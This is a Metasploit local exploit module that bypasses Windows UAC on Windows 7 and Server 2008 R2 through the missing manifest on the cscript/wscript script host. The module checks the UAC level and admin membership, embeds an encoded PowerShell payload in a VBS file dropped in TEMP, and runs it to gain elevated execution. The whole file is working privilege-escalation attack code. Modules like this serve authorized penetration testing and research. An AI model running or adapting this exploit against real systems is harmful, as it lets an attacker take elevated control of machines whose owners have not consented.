##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Local
  Rank = ExcellentRanking

  include Exploit::FileDropper
  include Exploit::Powershell
  include Post::File
  include Post::Windows::Priv
  include Post::Windows::Runas

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Windows Escalate UAC Protection Bypass (ScriptHost Vulnerability)',
        'Description' => %q{
          This module will bypass Windows UAC by utilizing the missing .manifest on the script host
          cscript/wscript.exe binaries.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'Vozzie',
          'Ben Campbell'
        ],
        'Platform' => [ 'win' ],
        'SessionTypes' => [ 'meterpreter' ],
        'Targets' => [
          [ 'Automatic', { 'Arch' => [ ARCH_X86, ARCH_X64 ] } ]
        ],
        'DefaultTarget' => 0,
        'References' => [
          ['URL', 'http://seclist.us/uac-bypass-vulnerability-in-the-windows-script-host.html'],
          ['URL', 'https://github.com/Vozzie/uacscript']
        ],
        'DisclosureDate' => '2015-08-22'
      )
    )
  end

  def exploit
    # Validate that we can actually do things before we bother
    # doing any more work
    validate_environment!
    check_permissions!

    # get all required environment variables in one shot instead. This
    # is a better approach because we don't constantly make calls through
    # the session to get the variables.
    env_vars = get_envs('TEMP', 'WINDIR')

    case get_uac_level
    when UAC_PROMPT_CREDS_IF_SECURE_DESKTOP,
        UAC_PROMPT_CONSENT_IF_SECURE_DESKTOP,
        UAC_PROMPT_CREDS, UAC_PROMPT_CONSENT
      fail_with(Failure::NotVulnerable,
                "UAC is set to 'Always Notify'. This module does not bypass this setting, exiting...")
    when UAC_DEFAULT
      print_good('UAC is set to Default')
      print_good('BypassUAC can bypass this setting, continuing...')
    when UAC_NO_PROMPT
      print_warning('UAC set to DoNotPrompt - using ShellExecute "runas" method instead')
      shell_execute_exe
      return
    end

    vbs_filepath = "#{env_vars['TEMP']}\\#{rand_text_alpha(8)}.vbs"

    upload_vbs(vbs_filepath)

    cmd_exec("cscript.exe //B #{vbs_filepath}")
  end

  def check_permissions!
    # Check if you are an admin
    vprint_status('Checking admin status...')
    admin_group = is_in_admin_group?

    if admin_group.nil?
      print_error('Either whoami is not there or failed to execute')
      print_error('Continuing under assumption you already checked...')
    elsif admin_group
      print_good('Part of Administrators group! Continuing...')
    else
      fail_with(Failure::NoAccess, 'Not in admins group, cannot escalate with this module')
    end

    if get_integrity_level == INTEGRITY_LEVEL_SID[:low]
      fail_with(Failure::NoAccess, 'Cannot BypassUAC from Low Integrity Level')
    end
  end

  def upload_vbs(payload_filepath)
    vbs = File.read(File.join(Msf::Config.data_directory,
                              'exploits',
                              'scripthost_uac_bypass',
                              'bypass.vbs'))

    command = cmd_psh_payload(payload.encoded, payload_instance.arch.first, remove_comspec: true)

    vbs.gsub!('COMMAND', command)
    print_status('Uploading the Payload VBS to the filesystem...')
    begin
      vprint_status("Payload VBS #{vbs.length} bytes long being uploaded..")
      write_file(payload_filepath, vbs)
      register_file_for_cleanup(payload_filepath)
    rescue Rex::Post::Meterpreter::RequestError => e
      fail_with(Failure::Unknown, "Error uploading file #{payload_filepath}: #{e.class} #{e}")
    end
  end

  def validate_environment!
    fail_with(Failure::None, 'Already in elevated state') if is_admin? || is_system?

    version = get_version_info
    if version.win7_or_2008r2?
      print_good("#{version.product_name} may be vulnerable.")
    else
      fail_with(Failure::NotVulnerable, "#{version.product_name} is not vulnerable.")
    end

    if is_uac_enabled?
      print_status('UAC is Enabled, checking level...')
    else
      unless is_in_admin_group?
        fail_with(Failure::NoAccess, 'Not in admins group, cannot escalate with this module')
      end
    end
  end
end
